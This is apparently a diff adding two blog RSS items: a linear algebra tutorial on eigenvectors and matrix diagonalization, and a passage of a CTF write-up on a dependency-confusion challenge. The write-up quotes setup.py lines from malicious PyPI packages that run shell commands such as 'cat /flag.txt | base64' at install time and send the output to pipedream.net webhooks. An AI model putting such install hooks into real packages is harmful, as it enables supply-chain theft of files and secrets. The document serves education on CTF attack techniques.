+&lt;h3 id=&quot;eigenvector--eigenvalues&quot;&gt;Eigenvector &amp;amp; Eigenvalues&lt;/h3&gt;
+
+&lt;p&gt;An &lt;strong&gt;&lt;em&gt;Eigenvector&lt;/em&gt;&lt;/strong&gt; is a non-zero vector that, when applied with a linear transformation, becomes a scalar multiple of the original. Formally, for a linear transformation $t$ and an &lt;strong&gt;&lt;em&gt;eigenvector&lt;/em&gt;&lt;/strong&gt; $\vec{v}\neq0$,&lt;/p&gt;
+
+\[t(\vec{v})=\lambda \vec{v}\]
+
+&lt;p&gt;for some constants $\lambda$. If we represent the linear transformation $t$ with matrix $A$, then&lt;/p&gt;
+
+\[A\vec{v}=\lambda \vec{v}.\]
+
+&lt;p&gt;The corresponding $\lambda$ is termed the &lt;strong&gt;&lt;em&gt;eigenvalue&lt;/em&gt;&lt;/strong&gt; for vector $\vec{v}$.&lt;/p&gt;
+
+&lt;h2 id=&quot;diagonalizing-matrix-with-eigenvectors&quot;&gt;Diagonalizing matrix with eigenvectors&lt;/h2&gt;
+
+&lt;p&gt;The standard procedure to diagonalize an $n\times n$ matrix is to find $n$ eigenvalues $\lambda_i$ (not required to be distinct) and form a diagonal matrix with them. $A$ is formed by corresponding eigenvectors. That is&lt;/p&gt;
+
+\[P=
+\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\vec{v_2} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+
+\end{pmatrix},\quad
+D=
+\begin{pmatrix}
+\lambda_{1} &amp;amp; &amp;amp; &amp;amp; \\
+&amp;amp; \lambda_{2} &amp;amp; &amp;amp; \\
+&amp;amp; &amp;amp; \ddots &amp;amp; \\
+&amp;amp; &amp;amp; &amp;amp; \lambda_{n} \\
+\end{pmatrix}
+\tag{1}\]
+
+&lt;p&gt;where&lt;/p&gt;
+
+\[A\vec{v_i}=\lambda_i\vec{v}_i			\quad\forall~1\le i \le n\tag{2}\]
+
+&lt;p&gt;Note that the vectors $\vec{v}_i$ should be linear independent. As $P$ is constructed from $\vec{v}_i$, if any of them are linear dependent, then we would not have $P^{-1}$.&lt;/p&gt;
+
+&lt;h3 id=&quot;an-example&quot;&gt;An example&lt;/h3&gt;
+
+&lt;p&gt;We’ll look at a sample of $2\times 2$ matrix diagonalization. Consider the matrix&lt;/p&gt;
+
+\[A =
+\begin{pmatrix}
+5 &amp;amp; 3 \\
+1 &amp;amp; 7
+\end{pmatrix}\]
+
+&lt;p&gt;We find the eigenvalues from the characteristic equation&lt;/p&gt;
+
+\[\begin{vmatrix}
+A-\lambda I
+\end{vmatrix}=0 \\
+
+(5-\lambda)(7-\lambda)-3=0 \\
+
+\lambda^2-12\lambda+32=0\\
+
+\lambda = 4 \text{ or } \lambda = 8\]
+
+&lt;p&gt;For $\lambda = 4$, the system \((A-\lambda I ~\vert~ 0)\) becomes&lt;/p&gt;
+
+\[\begin{pmatrix}
+\begin{array}{c c|c}
+1 &amp;amp; 3 &amp;amp; 0 \\
+1 &amp;amp; 3 &amp;amp; 0
+\\
+\end{array}
+\end{pmatrix}\]
+
+&lt;p&gt;Thus, \(\vec{v_1}=\begin{pmatrix}-3 \\ 1\end{pmatrix}\) is an eigenvector with eigenvalue $4$. One can easily verify that \(A\begin{pmatrix}-3 \\ 1\end{pmatrix} = 4\begin{pmatrix}-3 \\ 1\end{pmatrix}\).&lt;/p&gt;
+
+&lt;p&gt;For $\lambda = 8$, the system is&lt;/p&gt;
+
+\[\begin{pmatrix}
+\begin{array}{c c|c}
+-3 &amp;amp; 3 &amp;amp; 0 \\
+1 &amp;amp; -1 &amp;amp; 0
+\\
+\end{array}
+\end{pmatrix}\]
+
+&lt;p&gt;Thus, \(\vec{v_2}=\begin{pmatrix}1 \\ 1\end{pmatrix}\) is an eigenvector with eigenvalue $8$.&lt;/p&gt;
+
+&lt;p&gt;Therefore, the diagonalization is \(P=\begin{pmatrix}\vec{v}_1 &amp;amp; \vec{v}_2\end{pmatrix}=\begin{pmatrix} -3 &amp;amp;  1\\ 1 &amp;amp; 1\end{pmatrix}, \quad D=\begin{pmatrix}4 &amp;amp;  0\\ 0 &amp;amp; 8\end{pmatrix}\). We can verify that&lt;/p&gt;
+
+\[\begin{pmatrix}
+5 &amp;amp; 3 \\
+1 &amp;amp; 7
+\end{pmatrix}
+=
+\begin{pmatrix} -3 &amp;amp;  1\\ 1 &amp;amp; 1\end{pmatrix}\begin{pmatrix}4 &amp;amp;  0\\ 0 &amp;amp; 8\end{pmatrix}\begin{pmatrix} -3 &amp;amp;  1\\ 1 &amp;amp; 1\end{pmatrix}^{-1}.\]
+
+&lt;h2 id=&quot;deriving-from-the-similarity-diagram&quot;&gt;Deriving from the similarity diagram&lt;/h2&gt;
+
+&lt;p&gt;This way gives you a better intuition on why this works. We’ll introduce the similarity diagram adopted from Jim:&lt;/p&gt;
+
+\[\Large\begin{CD}
+\varepsilon_n      @&amp;gt;{A}&amp;gt;&amp;gt;  \varepsilon_n \\
+
+@A{\text{Rep}_{B,\varepsilon_n}(id)~}AA        @AA{~\text{Rep}_{B,\varepsilon_n}(id)}A\\
+
+B     @&amp;gt;&amp;gt;{D}&amp;gt;	B
+\end{CD}\]
+
+&lt;p&gt;The four corners signifies the basis that represent the space $\R^n$. We can see that there are two matrices $A, D$, representing the linear transformations $t:\varepsilon_n\to\varepsilon_n$ and $t: B\to B$ respectively, where $B=\lang \vec{\beta}_1,~ \dots \vec{\beta}_n \rang$ is an &lt;strong&gt;&lt;em&gt;eigenbasis&lt;/em&gt;&lt;/strong&gt;. The vertical arrows signifies the path to convert a vector in basis $B$ to $\varepsilon_n$. For sure it could be done with the change of basis matrix \(\text{Rep}_{B,\varepsilon_n}(id)\).&lt;/p&gt;
+
+&lt;p&gt;There are actually two ways to go from the upper-left corner to the upper-right one:&lt;/p&gt;
+
+\[\Large\begin{CD}
+\varepsilon_n      @&amp;gt;{A}&amp;gt;&amp;gt;  \varepsilon_n \\
+
+@.        @.\\
+
+B     @.	B
+\end{CD}\]
+
+&lt;p&gt;or&lt;/p&gt;
+
+\[\Large\begin{CD}
+\varepsilon_n      @.  \varepsilon_n \\
+
+@V{\textcolor{red}{\text{Rep}_{B,\varepsilon_n}(id)^{-1}~}}VV        @AA{~\text{Rep}_{B,\varepsilon_n}(id)}A \\
+
+B     @&amp;gt;&amp;gt;{D}&amp;gt;	B
+\end{CD}\]
+
+&lt;p&gt;Note that we flipped the first step and replaced it with the identity \(\text{Rep}_{B,D}(id)\times \text{Rep}_{D,B}(id)=I\). Intuitively, if we change the basis from $D$ to $B$ with \(\text{Rep}_{D,B}(id)\), and then from $B$ to $D$ with the matrix \(\text{Rep}_{B,D}(id)\), the overall operation is nothing. That is, in matrix terms, $I$.&lt;/p&gt;
+
+&lt;p&gt;In the second route, since we know $B$ is an eigenbasis, $D$ must be diagonal. Why? We try to construct $D=\text{Rep}_{B, B}(t)$ from the standard procedure.&lt;/p&gt;
+
+\[\begin{split}
+D&amp;amp;=\text{Rep}_{B, B}(t)\\
+&amp;amp;=\begin{pmatrix}
+\text{Rep}_{B}(t(\vec{\beta_1}))  &amp;amp; \dots &amp;amp; \text{Rep}_{B}(t(\vec{\beta_n}))
+\end{pmatrix}\\
+
+&amp;amp;=\begin{pmatrix}
+\text{Rep}_{B}(\lambda_1\vec{\beta_1}) &amp;amp; \dots &amp;amp; \text{Rep}_{B}(\lambda_n\vec{\beta_n})
+\end{pmatrix} \\ 
+
+&amp;amp;=\begin{pmatrix}
+\lambda_1\text{Rep}_{B}(\vec{\beta_1}) &amp;amp; \dots &amp;amp; \lambda_n\text{Rep}_{B}(\vec{\beta_n})
+\end{pmatrix} \quad\quad (3)\\
+
+&amp;amp;=\begin{pmatrix}
+\lambda_{1} &amp;amp; &amp;amp; &amp;amp; \\
+&amp;amp; \lambda_{2} &amp;amp; &amp;amp; \\
+&amp;amp; &amp;amp; \ddots &amp;amp; \\
+&amp;amp; &amp;amp; &amp;amp; \lambda_{n} \\
+\end{pmatrix}
+
+\end{split}\]
+
+&lt;p&gt;Step $(3)$ can be derived from scalar commutativity: \(\text{Rep}_B(\lambda_i\vec{\beta}_i)=\text{Rep}_{\varepsilon_n,B}(id)\times(\lambda_i\vec{\beta}_i)=\lambda_i\text{Rep}_{\varepsilon_n,B}(id)\times\vec{\beta}_i=\lambda_i\text{Rep}_{B}(\vec{\beta_i})\). Our last step come from the obvious fact that \(\text{Rep}_{B}(\vec{\beta_i})=\begin{pmatrix} \vdots\\ 1\\ \vdots \end{pmatrix}\), because of how we defined basis $B$. A &lt;a href=&quot;#basis&quot;&gt;routine checking&lt;/a&gt; from above shows&lt;/p&gt;
+
+\[0\vec{\beta}_1+\dots+1\vec{\beta}_i+\dots+0\vec{\beta}_n=\vec{\beta}_i.\]
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The overall operation of the route is thus \(\text{Rep}_{B,\varepsilon_n}(id)\cdot D\cdot\text{Rep}_{B,\varepsilon_n}(id)^{-1}\) (remember to apply each operation to the right). Since the two routes yield the same result, we can write&lt;/p&gt;
+
+\[A=\text{Rep}_{B,\varepsilon_n}(id)\cdot D\cdot\text{Rep}_{B,\varepsilon_n}(id)^{-1}\]
+
+&lt;p&gt;which is in the form \(A=PDP^{-1}\).&lt;/p&gt;
+
+&lt;div style=&quot;text-align: right&quot;&gt; $\square$ &lt;/div&gt;
+
+&lt;p&gt;For now, you should know the true form of $A=PDP^{-1}$:&lt;/p&gt;
+
+\[A=PDP^{-1}\iff\text{Rep}_{\varepsilon_n,\varepsilon_n}(t)=\text{Rep}_{B,\varepsilon_n}(id)\cdot \text{Rep}_{B,B}(t)\cdot\text{Rep}_{B,\varepsilon_n}(id)^{-1}\]
+
+&lt;p&gt;What we are actually doing is to change the basis from $\varepsilon_n$ to an eigenbasis $B$ with $P^{-1}$ (that is \(\text{Rep}_{\varepsilon_n,B}(id)\)), so that the linear transformation in that basis could be represented by a diagonal matrix $D$. We finally convert the vector back to basis $\varepsilon_n$ with $P$. This should be clear as demonstrated by the similarity diagram.&lt;/p&gt;
+
+&lt;h2 id=&quot;verifying-with-matrix-operation&quot;&gt;Verifying with matrix operation&lt;/h2&gt;
+
+&lt;p&gt;We’ll now use a more algebraic way to prove the statement. We follow the construction from the section &lt;a href=&quot;#diagonalizing-matrix-with-eigenvectors&quot;&gt;Diagonalizing matrix with eigenvectors&lt;/a&gt;.&lt;/p&gt;
+
+\[\begin{split}
+PDP^{-1}&amp;amp;=
+
+\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+\end{pmatrix}
+
+\begin{pmatrix}
+\lambda_{1} &amp;amp; &amp;amp; \\
+&amp;amp; \ddots &amp;amp; \\
+&amp;amp; &amp;amp; \lambda_{n} \\
+\end{pmatrix}
+
+\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+\end{pmatrix}^{-1}\\
+
+&amp;amp;= \begin{pmatrix}
+\lambda_1 \vec{v_1} &amp;amp;
+\dots &amp;amp;
+\lambda_n \vec{v_n}
+\end{pmatrix}
+
+\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+\end{pmatrix}^{-1}\\
+
+&amp;amp;= \begin{pmatrix}
+A \vec{v_1} &amp;amp;
+\dots &amp;amp;
+A \vec{v_n}
+\end{pmatrix}
+
+\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+\end{pmatrix}^{-1}\\
+
+&amp;amp;= A\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+\end{pmatrix}
+
+\begin{pmatrix}
+\vec{v_1} &amp;amp;
+\dots &amp;amp;
+\vec{v_n}
+\end{pmatrix}^{-1}  \\
+
+&amp;amp;= A
+
+\end{split}\]
+
+&lt;div style=&quot;text-align: right&quot;&gt; $\square$ &lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;The similarity diagram and basis thing could be too theoretic, but it is definitely worth it to understand the whole logic behind. With all the hard work above, we finally arrived at the diagonalization method, which is a powerful tool for fast matrix exponentials. In the theorem \(A^k=PD^kP^{-1}\), it is much easier to compute $D^k$ and $P^{-1}$ compared to $A^k$.&lt;/p&gt;
+
+&lt;p&gt;As I mentioned in the intro, eigenvectors and diagonalization are so closely related that I still don’t know which one was first defined (In Jim’s book, the concept of eigenvectors first appear in the diagonalization section without being named) . Maybe I’ll take a look at the developement of linear algebra for fun.&lt;/p&gt;
+
+&lt;p&gt;Notations and insights for the similarity diagrams come from &lt;a href=&quot;https://hefferon.net/linearalgebra/&quot;&gt;&lt;em&gt;Linear Algebra&lt;/em&gt;&lt;/a&gt; by Jim Hefferon.&lt;/p&gt;
+</description>
+                <pubDate>Wed, 12 May 2021 00:00:00 +0000</pubDate>
+                <link>https://stdor7314.github.io/2021/05/12/The-logic-behind-matrix-diagonalization.html</link>
+                <guid isPermaLink="true">https://stdor7314.github.io/2021/05/12/The-logic-behind-matrix-diagonalization.html</guid>
+                
+                <category>maths</category>
+                
+                <category>linear-algebra</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>Securinet CTF 2021 : Hack the Empire</title>
+                <description>&lt;p&gt;Package managers are wonderful solutions to dependency issues, and they provide a simple interface for developers to install libraries. But what’s working behind when you’re typing that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;npm&lt;/code&gt;, ..? This cool challenge highlights some of the potential pitfalls due to misconfigurations.&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The challenge&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;An enemy of The Empire have a job for you. As an adversary he want to hack CTFQ21EmpireTmp. He heard that in their server is hosting their holy flag in /flag.txt&lt;/p&gt;
+
+  &lt;p&gt;No IP address is needed in this task. Good luck.&lt;/p&gt;
+
+  &lt;p&gt;̿̿ ̿̿ ̿̿ ̿’̿’\̵͇̿̿\з= ( ▀ ͜͞ʖ▀) =ε/̵͇̿̿/’̿’̿ ̿ ̿̿ ̿̿ ̿̿&lt;/p&gt;
+
+  &lt;p&gt;Important: Whatever was the solution that you’re going to adopt, if you want to use webhooks, DO NOT USE any of those that allows other participants to see the flag (don’t use webhook.site, you may let other participants to catch the flag from there) (for example you can use requestbin instead of webhook.site since the flag can be seen by the authenticated user). Think about using a method that will not leave anybody else to read the flag from your steps. And don’t forget to remove your work after you solve the task to avoid anybody else to steal it.&lt;/p&gt;
+
+  &lt;p&gt;Hint 1: find the original web page (in the original website) that was sharing what you’ve found since that page is not updated&lt;/p&gt;
+
+  &lt;p&gt;Author: TheEmperors&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;writeup&quot;&gt;Writeup&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This is not quite the intended solution as I have skipped some steps and went in the wrong direction. You can refer to the the &lt;a href=&quot;https://github.com/mohamedaymenkarmous/CTF/tree/master/CTFSecurinetsQuals2021#hack-the-empire&quot;&gt;official writeup&lt;/a&gt; from the  awesome author :)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The only thing provided is the keyword &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTFQ21EmpireTmp&lt;/code&gt;, so we’ll google that. We come across this &lt;a href=&quot;https://stackoverflow.com/questions/66717285/is-there-any-limit-in-pythons-requirements-txt-during-the-installation&quot;&gt;stackoverflow post&lt;/a&gt;. Looks like the author is downloading python packages from a &lt;strong&gt;private repo&lt;/strong&gt; with the name matching &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf-q21-empire-tmp-[a-z0-9\-]{5,10}&lt;/code&gt; every 5 minutes. The following configurations are used:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;global]
+extra-index-url &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; http://&amp;lt;private_IP_and_port&amp;gt;/simple/
+trusted-host &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;private_IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Before I fully understand the above conclusion, I have already googled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf-q21-empire-tmp-&lt;/code&gt;. The search results returned a package from PyPI (already removed at the time) and a mirror. So we pulled the source code from these two sites:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;PyPI (luckily Google has cached the source code, so we were able to have a peak in it. Turns out it wasn’t intended.)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2021-03-23-SecurinetCTF2021-Hack-the-Empire/pypi-package.png&quot; alt=&quot;pypi-package&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I am initially confused by this, as the stackoverflow post says that they’re using a &lt;strong&gt;private repo&lt;/strong&gt;, with ‘billions of packages’. Later I realize that it is a hint from the author (Though it’s still possible in a real-case scenario: think of a company owning a private repo publishing some of them to a public repo).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The mirror &lt;a href=&quot;https://pypi.tuna.tsinghua.edu.cn/simple/&quot;&gt;https://pypi.tuna.tsinghua.edu.cn/simple/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/2021-03-23-SecurinetCTF2021-Hack-the-Empire/mirror-package.png&quot; alt=&quot;mirror-package&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.py&lt;/code&gt; across different versions are more or less the same - they send the output of a command to a server. So I filter the scripts with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep -rin requests.get.*&lt;/code&gt;. It gives the following output:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf_q21_empire_tmp_bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw42069&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://enc2i9ljmjy100e.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cat /flag.txt | base64&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ctf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;q21&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empire&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bw13434&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://ene63d9dv33i6ch.m.pipedream.net/?hehe=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#cat /flag.txt | base64&quot;).read())
